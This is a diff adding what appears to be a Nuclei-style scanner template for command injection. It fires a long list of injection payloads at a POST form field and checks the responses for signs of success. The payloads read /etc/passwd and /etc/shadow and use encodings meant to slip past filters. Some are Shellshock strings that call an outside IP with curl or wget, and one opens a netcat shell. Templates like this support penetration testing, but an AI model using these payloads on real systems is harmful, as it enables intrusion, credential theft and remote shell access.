@@ -1,0 +1,96 @@
+
+id: command-injection
+
+info:
+  name: Command Injection Template
+  author: suriryuk
+  severity: Critical
+  description: Determine whether a command injection attack was successful.
+  tags: RCE, cmdi
+
+http:
+  - pre-condition:
+    - type: dsl
+      dsl:
+        - "method == POST"
+        - "len(body) > 0"
+      condition: and
+
+  - raw:
+    - |
+      POST {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      ip={{injection}}&Submit=Submit
+
+    payloads:
+      injection:
+        - "%3B%2Fusr%2Fbin%2Fid%5C"
+        - "/*$(id)`id`*/"
+        - "%26cat%3C%2Fetc%2Fpasswd"
+        - "||id"
+        - "id%0A"
+        - "&&cat%20/etc/passwd"
+        - "%60cat%20/etc/passwd%60"
+        - "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+echo${IFS}\"RCE\"${IFS}&&cat${IFS}/etc/shadow"
+        - "%2C%20system%28%27id%27%29"
+        - "&lt;/?php system(\"id\"); ?&gt;"
+        - "||id|"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%2Cid"
+        - "%60id%60"
+        - "%3B%20id"
+        - "() { :;}; /bin/bash -c \"wget http://135.23.158.130/.testing/shellshock.txt?vuln=24?shell=\\`nc -lvvp 1235 -e /bin/bash\\`\""
+        - "%29%0aid"
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%3B%0Awhoami%0A"
+        - "||/usr/bin/id"
+        - "i%27d"
+        - "%7C%20%60id%60"
+        - "() { :;}; /bin/bash -c \"sleep 5 && curl http://135.23.158.130/.testing/shellshock.txt?vuln=20?sleep=7&?vuln=7\""
+        - "%2Cid"
+        - "%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd"
+        - "||/usr/bin/id"
+        - "/*$(id)`id`\";*/"
+        - "<!--#exec cmd=\"/bin/cat /etc/shadow\"-->"
+        - "%0Aid"
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd"
+        - "%27%0aid%0a"
+        - "&cat%24IFS%2Fetc%2Fpasswd"
+        - "%27%20%60id%60%3B"
+        - "%7Cid"
+        - "%0Aid"
+        - "() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=17?user=\\`whoami\\`\""
+        - "%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "%60id%60"
+        - "%3Bphpinfo"
+        - "%7C%0Awhoami%0A%7C"
+        - "%0Aid"
+        - ";id|"
+        - "cat /etc/passwd"
+        - "%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60"
+        - "|cat$u+/etc$u/passwd"
+        - "%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u"
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+        - "%3Bsystem%28%27id%27%29"
+        - "() { :;}; /bin/bash -c \"sleep 6 && echo vulnerable 6\""
+        - "<!--#exec cmd=\"/bin/cat /etc/passwd\"-->"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: regex
+        name: attack-success
+        regex:
+          - "uid=[^\\n]+ gid=[^\\n]+ groups=[^\\n]+"
+          - "root:x:[0-9]+:[0-9]+:root:\\/root:"
+          - "root:\\*:[0-9]+:[0-9]+:[0-9]+:[0-9]+:::"
+
+      - type: word
+        name: attack-success-id
+        words:
+          - "www-data"
+        part: body
+        
